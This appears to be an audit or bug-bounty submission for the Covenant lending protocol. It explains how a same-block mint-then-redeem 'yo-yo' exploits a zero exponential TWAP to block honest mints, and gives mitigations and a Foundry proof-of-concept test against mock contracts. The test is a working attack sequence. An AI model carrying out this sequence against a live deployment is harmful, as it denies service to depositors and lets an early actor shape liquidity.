      "body": "The protocol throttles growth and exits using a time weighted average of base supply (ETWAP). Two cap rules are relevant:\n\nMint cap (once out of bootstrap):\nLet S_cur be current base supply and ETWAP the exponential TWAP of base supply. The cap enforces\nWhen ETWAP is very small, any positive mint fails.\n\nRedeem cap:\nRequires a post state floor tied to ETWAP, for examplen When ETWAP is very small, very large redemptions pass.\n\nETWAP is updated inside _calculateMarketState using an exponential half life. In the same block, elapsedTime = 0, so lastETWAPBaseSupply does not move. In the first block of market activity, ETWAP is effectively zero. The mint and redeem caps both anchor to this stale value.\n\nThis creates a griefing path:\n\nPhase 1 (bootstrap no-cap): Attacker performs a very large first mint while base supply is below 2^noCapLimit. Bootstrap rules apply, so the mint is effectively uncapped.\n\nPhase 2 (same block redeem): Attacker immediately redeems roughly 99 percent in the same block. ETWAP is still near zero, so the redeem cap is loose. The attacker drains down to a small S_cur, but keeps it above the bootstrap threshold so the system considers the market out of bootstrap.\n\nPhase 3 (DoS window): Now that bootstrap is off, the mint cap applies. With ETWAP tiny, the inequality S_post ≤ 2·ETWAP blocks any honest mint. The window can last many minutes because ETWAP climbs with an exponential half life, and the attacker can keep it low relative to S_cur by touching the market periodically to advance lastUpdateTimestamp while keeping ETWAP lagging.\n\nNo direct theft occurs, but honest growth is blocked and exits remain relatively unconstrained during the lag. In young or rapidly expanding markets, this breaks liveness for new lenders and can be used to shape liquidity around the attacker’s schedule.\n\nWhy it happens\n\nDesign coupling: Both caps reference ETWAP, which is intentionally slow moving. In the first block it is zero.\nRoot cause: _calculateMarketState updates lastETWAPBaseSupply only when elapsedTime > 0, and the update uses an exponential half life (see DebtMath).\n\nAsymmetry: Mint cap is strict with small ETWAP. Redeem cap is permissive with small ETWAP.\n\nBootstrap boundary: noCapLimit allows a large first mint with no cap. The next action in the same block can redeem most of it while ETWAP is still zero, then leave S_cur just above 2^noCapLimit, which flips on the strict mint cap for everyone else.\n\nImpact\n\nMint DoS for a sustained period after the attacker executes the yo-yo sequence. Honest deposits revert with E_LEX_MintCapExceeded.\n\nLiquidity shaping where the attacker can time exits and leave the market stuck in a low ETWAP state relative to S_cur.\n\nUser harm: blocked market growth, failed user transactions, degraded UX, potential market capture by an early actor.\n\n\nMitifations:\n\nSeed ETWAP on first growth: On the first non zero supply update, initialize lastETWAPBaseSupply = baseSupply (or a large fraction like 80 percent). This removes the near zero anchor.\n\nDual anchored caps: Make both caps reference current supply as well as ETWAP. For example:\n\nMint cap: S_post ≤ max(2·ETWAP, S_cur + β·S_cur) with small β, or add a minimum absolute mint allowance to avoid total DoS when ETWAP is tiny.\n\nRedeem cap: S_post ≥ max(α·ETWAP, γ·S_cur) with γ in the 50 to 70 percent range. This prevents near total drains when ETWAP is tiny.",
      "proofOfConcept": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity ^0.8.30;\n\nimport \"forge-std/Test.sol\";\n\n// Project deps (as in your template)\nimport {CovenantCurator} from \"../../src/curators/CovenantCurator.sol\";\nimport {StubPriceOracle} from \"../mocks/StubPriceOracle.sol\";\nimport {MockChainlinkAggregator} from \"./mocks/MockChainlinkAggregator.sol\";\nimport {ChainlinkOracle} from \"../../src/curators/oracles/chainlink/ChainlinkOracle.sol\";\nimport {MockPyth} from \"./mocks/MockPyth.sol\";\nimport {PythOracle} from \"../../src/curators/oracles/pyth/PythOracle.sol\";\n\nimport {SynthToken} from \"../../src/synths/SynthToken.sol\";\nimport {Covenant, MarketId, MarketParams, MarketState, SynthTokens} from \"../../src/Covenant.sol\";\nimport {LatentSwapLEX} from \"../../src/lex/latentswap/LatentSwapLEX.sol\";\nimport {LSErrors} from \"../../src/lex/latentswap/libraries/LSErrors.sol\";\nimport {FixedPoint} from \"../../src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {DebtMath} from \"../../src/lex/latentswap/libraries/DebtMath.sol\";\nimport {ICovenant, IERC20, AssetType, SwapParams, RedeemParams, MintParams} from \"../../src/interfaces/ICovenant.sol\";\nimport {ISynthToken} from \"../../src/interfaces/ISynthToken.sol\";\nimport {IPriceOracle} from \"../../src/interfaces/IPriceOracle.sol\";\nimport {ILiquidExchangeModel} from \"../../src/interfaces/ILiquidExchangeModel.sol\";\nimport {ILatentSwapLEX, LexState, LexConfig} from \"../../src/lex/latentswap/interfaces/ILatentSwapLEX.sol\";\nimport {MockOracle} from \"../mocks/MockOracle.sol\";\nimport {MockERC20} from \"../mocks/MockERC20.sol\";\nimport {WadRayMath} from \"@aave/libraries/math/WadRayMath.sol\";\nimport {IERC20Metadata} from \"@openzeppelin/token/ERC20/extensions/IERC20Metadata.sol\";\nimport {UtilsLib} from \"../../src/libraries/Utils.sol\";\nimport {LatentSwapLib} from \"../../src/periphery/libraries/LatentSwapLib.sol\";\n\ncontract CovenantYoYoETWAPPoC is Test {\n    using WadRayMath for uint256;\n\n    // LatentSwapLEX init parameters\n    uint160 internal constant P_MAX = uint160((1095445 * FixedPoint.Q96) / 1_000_000); // ~1.2 in Q96\n    uint160 internal constant P_MIN = uint160(FixedPoint.Q192 / P_MAX);\n    uint32  internal constant DURATION = 30 days; // debtDuration\n    uint8   internal constant SWAP_FEE = 0;\n    int64   internal constant LN_RATE_BIAS = 5_012_540_000_000_000; // WAD\n\n    // LTV boundaries (~95% high-LTV limit, ~99.99% max-LTV)\n    uint160 private P_LIM_H   = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);\n    uint160 private P_LIM_MAX = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);\n\n    // Core\n    Covenant public covenant;\n    LatentSwapLEX public lex;\n\n    // Oracle infra\n    address public _mockOracle;\n    CovenantCurator public covenantCurator;\n    StubPriceOracle  public covenantCuratorOracle;\n    MockChainlinkAggregator public chainlinkAggregator;\n    ChainlinkOracle public chainlinkOracle;\n    MockPyth public pyth;\n    PythOracle public pythOracle;\n\n    // Assets\n    address public _mockBaseAsset;\n    address public _mockQuoteAsset;\n\n    // Market\n    MarketId internal _marketId;\n    MarketParams internal _marketParams;\n\n    // Actors\n    address attacker = address(0xA11CE);\n    address user     = address(0xBEEF);\n\n    function setUp() public {\n        vm.deal(attacker, 100 ether);\n        vm.deal(user, 100 ether);\n\n        // Mock “curator” oracle enabled in Covenant\n        _mockOracle = address(new MockOracle(address(this)));\n\n        // Tokens\n        _mockBaseAsset = address(new MockERC20(address(this), \"MockBaseAsset\", \"MBA\", 18));\n        _mockQuoteAsset = address(new MockERC20(address(this), \"MockQuoteAsset\", \"MQA\", 18));\n\n        // Seed balances\n        MockERC20(_mockBaseAsset).mint(attacker, 1_000e18);\n        MockERC20(_mockBaseAsset).mint(user,     1_000e18);\n\n        // Covenant + LEX\n        covenant = new Covenant(address(this));\n        lex = new LatentSwapLEX(\n            address(this),\n            address(covenant),\n            P_MAX,\n            P_MIN,\n            P_LIM_H,\n            P_LIM_MAX,\n            LN_RATE_BIAS,\n            DURATION,\n            SWAP_FEE\n        );\n\n        covenant.setEnabledLEX(address(lex), true);\n        covenant.setEnabledCurator(_mockOracle, true);\n\n        _marketParams = MarketParams({\n            baseToken:  _mockBaseAsset,\n            quoteToken: _mockQuoteAsset,\n            curator:    _mockOracle,\n            lex:        address(lex)\n        });\n        _marketId = covenant.createMarket(_marketParams, hex\"\");\n\n        // Optional extra oracles from template (not used in PoC)\n        covenantCurator = new CovenantCurator(address(this));\n        covenantCuratorOracle = new StubPriceOracle();\n        covenantCurator.govSetConfig(_mockBaseAsset, _mockQuoteAsset, address(covenantCuratorOracle));\n        chainlinkAggregator = new MockChainlinkAggregator(8);\n        chainlinkOracle = new ChainlinkOracle(_mockBaseAsset, _mockQuoteAsset, address(chainlinkAggregator), 1 hours);\n        pyth = new MockPyth();\n        pythOracle = new PythOracle(address(pyth), _mockBaseAsset, _mockQuoteAsset, bytes32(uint256(196)), 10 minutes, 250);\n\n        // Sanity: LEX configured\n        LexConfig memory cfg = lex.getLexConfig(_marketId);\n        assertTrue(cfg.aToken != address(0) && cfg.zToken != address(0), \"LEX not initialized\");\n    }\n\n    /// -----------------------------------------------------------------------\n    /// PoC B: “Mint DoS via ETWAP lag” (no price move; just ETWAP dynamics)\n    ///\n    /// 1) Attacker mints big in first block → ETWAP ≈ 0\n    /// 2) Immediately redeems ~97% in the same block (leave supply ABOVE bootstrap threshold)\n    /// 3) Honest user tries a normal mint → reverts E_LEX_MintCapExceeded()\n    ///    because cap uses tiny ETWAP while bootstrap is OFF (supply > threshold)\n    /// 4) After time passes, the same mint succeeds (ETWAP caught up inside mint call)\n    /// -----------------------------------------------------------------------\n    function test_submissionValidity() public {\n        LexConfig memory cfg = lex.getLexConfig(_marketId);\n        uint256 noCapThreshold = uint256(1) << cfg.noCapLimit; // 2^noCapLimit\n\n        // ============ Attacker approvals ============\n        vm.startPrank(attacker);\n        IERC20(_mockBaseAsset).approve(address(covenant), type(uint256).max);\n\n        // ============ 1) Huge first mint (ETWAP still ~0) ============\n        uint256 bigMint = 100e18;\n        (uint256 a1, uint256 z1) = _mint(attacker, bigMint);\n\n        // Supply grew\n        MarketState memory ms1 = covenant.getMarketState(_marketId);\n        assertGt(ms1.baseSupply, bigMint / 2, \"baseSupply didn't grow\");\n\n        // ETWAP is still ~0 in the same block\n        LexState memory st1 = lex.getLexState(_marketId);\n        assertEq(st1.lastETWAPBaseSupply, 0, \"ETWAP should be ~0 right after first mint in same block\");\n\n        // ============ 2) Redeem ~97% immediately (same block) ============\n        // We leave ~3e18 supply which is > typical 2^noCapLimit (~1.15e18 with noCapLimit=60)\n        uint256 aBal = IERC20(cfg.aToken).balanceOf(attacker);\n        uint256 zBal = IERC20(cfg.zToken).balanceOf(attacker);\n        assertGt(aBal, 0);\n        assertGt(zBal, 0);\n\n        uint256 aIn = (aBal * 97) / 100; // NOT full redeem; leave dust & keep above threshold\n        uint256 zIn = (zBal * 97) / 100;\n\n        uint256 baseOut = _redeem(attacker, aIn, zIn);\n        (baseOut); // silence\n\n        MarketState memory ms2 = covenant.getMarketState(_marketId);\n        assertGt(ms2.baseSupply, noCapThreshold, \"post-supply dropped below bootstrap threshold (should be above)\");\n\n        // ETWAP still ~0 (same block)\n        LexState memory st2 = lex.getLexState(_marketId);\n        assertEq(st2.lastETWAPBaseSupply, 0, \"ETWAP should still be ~0 (no elapsed time)\");\n\n        vm.stopPrank();\n\n        // ============ 3) Honest user tries to mint → should revert by mint cap ============\n        vm.startPrank(user);\n        IERC20(_mockBaseAsset).approve(address(covenant), type(uint256).max);\n\n        uint256 userMint = 10e18;\n        // Because current supply > noCapThreshold, bootstrap no-cap is OFF,\n        // and ETWAP ~ 0, the mint cap enforces post ≤ 2×ETWAP → essentially 0\n        vm.expectRevert(abi.encodeWithSignature(\"E_LEX_MintCapExceeded()\"));\n        _mint(user, userMint);\n        vm.stopPrank();\n\n        // After attacker’s yo-yo:\n        for (uint i = 0; i < 6; i++) {\n            vm.warp(block.timestamp + 5 minutes);             // small time steps\n            covenant.updateState(_marketId, _marketParams, hex\"\", 0);  // touch market so accrual runs\n            vm.startPrank(user);\n            vm.expectRevert(abi.encodeWithSignature(\"E_LEX_MintCapExceeded()\"));\n            _mint(user, 1e18);                                 // honest, reasonable mint\n            vm.stopPrank();\n        }\n    }\n\n    // ----------------- helpers -----------------\n\n    function _mint(address to, uint256 baseAmountIn) internal returns (uint256 aOut, uint256 zOut) {\n        MintParams memory mp = MintParams({\n            marketId: _marketId,\n            marketParams: _marketParams,\n            baseAmountIn: baseAmountIn,\n            to: to,\n            minATokenAmountOut: 0,\n            minZTokenAmountOut: 0,\n            data: hex\"\",     // no oracle payload needed for MockOracle\n            msgValue: 0\n        });\n        (aOut, zOut) = covenant.mint(mp);\n    }\n\n    function _redeem(address to, uint256 aTokenIn, uint256 zTokenIn) internal returns (uint256 baseOut) {\n        RedeemParams memory rp = RedeemParams({\n            marketId: _marketId,\n            marketParams: _marketParams,\n            aTokenAmountIn: aTokenIn,\n            zTokenAmountIn: zTokenIn,\n            to: to,\n            minAmountOut: 0,\n            data: hex\"\",\n            msgValue: 0\n        });\n        baseOut = covenant.redeem(rp);\n    }\n}",
